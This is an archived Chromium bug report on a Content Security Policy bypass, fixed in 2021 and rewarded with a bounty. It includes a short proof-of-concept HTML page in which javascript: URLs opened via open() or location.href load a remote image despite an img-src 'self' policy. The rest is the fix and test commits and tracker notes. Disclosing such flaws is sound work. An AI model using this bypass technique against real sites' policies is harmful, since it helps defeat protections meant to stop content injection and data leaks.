# Chrome Content security Policy bypass

| Field | Value |
|-------|-------|
| **Issue ID** | [40095297](https://issues.chromium.org/issues/40095297) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P3 |
| **Component** | Blink>SecurityFeature>ContentSecurityPolicy |
| **Platforms** | Mac |
| **Reporter** | no...@gmail.com |
| **Assignee** | an...@chromium.org |
| **Created** | 2019-06-05 |
| **Bounty** | $1,000.00 |

## Description

UserAgent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.80 Safari/537.36

Steps to reproduce the problem:
Same as the issue I submitted earlier:

https://bugs.chromium.org/p/chromium/issues/detail?id=671271

I submitted this issue in 2016 , and In 62.0.3197.0, you landed the fix.
but in 75.0.3770.80 this security issue can be reproduced again.

how to reproduce:

Edit an html file like this

```
<html>
<meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-inline' 'self';img-src 'self'"/>
<body>
<button onclick="breakit1()">CSP TEST1</button>
<button onclick="breakit2()">CSP TEST2</button>
<script>
    function breakit1(){
        open("javascript:'<img src=https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png>'","_self");
    }

    function breakit2(){

        location.href="javascript:'<img src=https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png>'";
    }
</script>

</body>
</html>
```

Click the button and you will find that the image was successfully loaded.
Content-Security-Policy img-src directive is set to 'self'.

What is the expected behavior?
Content security Policy block this image

What went wrong?
remote image is loaded

Did this work before? N/A 

Chrome version: 75.0.3770.80  Channel: n/a
OS Version: OS X 10.14.3
Flash Version: 

Will the issue I submitted this time satisfy your bug bounty?
The issue(671271) I submitted earlier(2016) was duplicated by 756040  which submitted later (2017),and I lose my first CVE..

## Timeline

### wf...@chromium.org (2019-06-05)

Thanks for your report. Re: your final comment -  will investigate what happened there.

[Monorail components: Blink>SecurityFeature>ContentSecurityPolicy]

### mm...@chromium.org (2019-07-01)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-10-23)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-12-11)

[Empty comment from Monorail migration]

### sh...@chromium.org (2020-02-05)

[Empty comment from Monorail migration]

### [Deleted User] (2020-04-09)

[Empty comment from Monorail migration]

### ar...@chromium.org (2020-04-21)

[Empty comment from Monorail migration]

### [Deleted User] (2020-05-20)

[Empty comment from Monorail migration]

### [Deleted User] (2020-07-16)

[Empty comment from Monorail migration]

### [Deleted User] (2020-08-26)

[Empty comment from Monorail migration]

### [Deleted User] (2020-10-07)

[Empty comment from Monorail migration]

### [Deleted User] (2020-10-30)

[Empty comment from Monorail migration]

### [Deleted User] (2020-11-18)

[Empty comment from Monorail migration]

### [Deleted User] (2021-01-20)

[Empty comment from Monorail migration]

### ad...@google.com (2021-01-20)

[Empty comment from Monorail migration]

### [Deleted User] (2021-03-03)

[Empty comment from Monorail migration]

### an...@chromium.org (2021-03-05)

This is fixed by https://chromium-review.googlesource.com/c/chromium/src/+/2725520.

Regression test in https://chromium-review.googlesource.com/c/chromium/src/+/2739345.

### [Deleted User] (2021-03-05)

[Empty comment from Monorail migration]

### [Deleted User] (2021-03-05)

[Empty comment from Monorail migration]

### gi...@appspot.gserviceaccount.com (2021-03-09)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/4d197f3b750643bfff2d8ea16c22554a1b0effe3

commit 4d197f3b750643bfff2d8ea16c22554a1b0effe3
Author: Antonio Sartori <antoniosartori@chromium.org>
Date: Tue Mar 09 10:25:07 2021

CSP: Add WPT for javascript URL inheritance

This CL adds a Web Platform Test checking that executing a Javascript
URL in the top frame keeps the Content Security Policies of the
document.

Bug: 1149272,971231
Change-Id: Ib696b0877d96a82f1546947e93ff0d324b1bbf94
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2739345
Commit-Queue: Antonio Sartori <antoniosartori@chromium.org>
Reviewed-by: Arthur Sonzogni <arthursonzogni@chromium.org>
Cr-Commit-Position: refs/heads/master@{#861088}

[add] https://crrev.com/4d197f3b750643bfff2d8ea16c22554a1b0effe3/third_party/blink/web_tests/external/wpt/content-security-policy/inheritance/javascript-url-open-in-main-window.html
[add] https://crrev.com/4d197f3b750643bfff2d8ea16c22554a1b0effe3/third_party/blink/web_tests/external/wpt/content-security-policy/inheritance/support/navigate-self-to-javascript.html


### an...@chromium.org (2021-03-11)

In https://crbug.com/chromium/971231#c17 I copied the wrong CL.

This has been fixed by https://chromium-review.googlesource.com/c/chromium/src/+/2667858.

### am...@google.com (2021-03-24)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@google.com (2021-03-24)

Hello, nohackair@! The VRP Panel has decided to award you $1000 for this report. A member of our finance team will with in touch with you soon to arrange payment. Please let me by what name or handle you would like to be credited in release notes. Thanks for reporting this issue! 

### am...@google.com (2021-03-29)

[Empty comment from Monorail migration]

### am...@chromium.org (2021-05-24)

[Empty comment from Monorail migration]

### am...@google.com (2021-05-24)

[Empty comment from Monorail migration]

### am...@chromium.org (2021-05-24)

hi, nohackair@ - just checking in again to see if you would like to be credited for this issue and CVE in the release notes. If so, please let me know the name/handle you'd like us to use to credit you. Thanks! 

### am...@google.com (2021-06-07)

[Empty comment from Monorail migration]

### [Deleted User] (2021-06-11)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/971231?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail mergedwith: crbug.com/chromium/1072719]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40095297)*
